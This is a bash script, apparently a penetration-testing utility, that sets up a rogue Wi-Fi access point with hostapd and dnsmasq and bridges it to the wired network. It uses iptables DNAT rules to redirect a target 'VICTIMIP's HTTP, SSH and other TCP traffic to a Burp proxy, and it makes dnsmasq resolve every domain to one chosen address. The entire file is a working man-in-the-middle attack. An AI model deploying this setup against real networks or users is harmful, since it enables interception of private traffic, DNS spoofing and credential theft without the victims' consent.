#!/bin/bash
#
# Create a wireless router and redirect the traffic to a transparrent proxy
# Tested using invisible Burp proxy
#

USERDIR=$1

source $USERDIR/config.txt
if [ -z "$DNSMASQSUBNET" ]
then
	echo "Cannot source the configuartion"
	exit 1
fi

cd $USERDIR/wireless/

service network-manager stop
killall -w hostapd
killall -w dnsmasq
killall -w wpa_supplicant
rfkill unblock wlan

ifconfig $WLAN 0.0.0.0
ifconfig $ETH 0.0.0.0

iw dev $WLAN set 4addr on

brctl addbr $BR
brctl addif $BR $WLAN
brctl addif $BR $ETH
ifconfig $BR $DEFAULTGW up

LAN=$BR

# remove "-s $VICTIMIP" if you want to redirect all the traffic, not just wireless
iptables -t nat -A PREROUTING -i $LAN -p tcp --dport 80 -s $VICTIMIP -m conntrack --ctstate NEW -j DNAT --to $BURP:80
iptables -t nat -A PREROUTING -i $LAN -p tcp --dport 22 -s $VICTIMIP -m conntrack --ctstate NEW -j DNAT --to $BURP:2222
iptables -t nat -A PREROUTING -i $LAN -p tcp --match multiport ! --dports 80,22 -s $VICTIMIP -m conntrack --ctstate NEW -j DNAT --to $BURP:443
iptables -t nat -A PREROUTING -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface $WAN -j MASQUERADE
iptables --append FORWARD --in-interface $LAN -j ACCEPT

sed "s/interface=.*/interface=$HOSTAPIF/g" -i hostapd.conf
sed "s/wpa_passphrase=.*/wpa_passphrase=$HOSTAPPSW/g" -i hostapd.conf
sed "s/ssid=.*/ssid=$HOSTAPSSID/g" -i hostapd.conf
sed "s/interface=.*/interface=$HOSTAPIF/g" -i dnsmasq.conf
sed "s/address=.*/address=\/#\/$DNSMASQRESP/g" -i dnsmasq.conf
sed "s/dhcp-range=.*/dhcp-range=$DNSMASQRANGE,12h/g" -i dnsmasq.conf

hostapd hostapd.conf -B
dnsmasq -C dnsmasq.conf

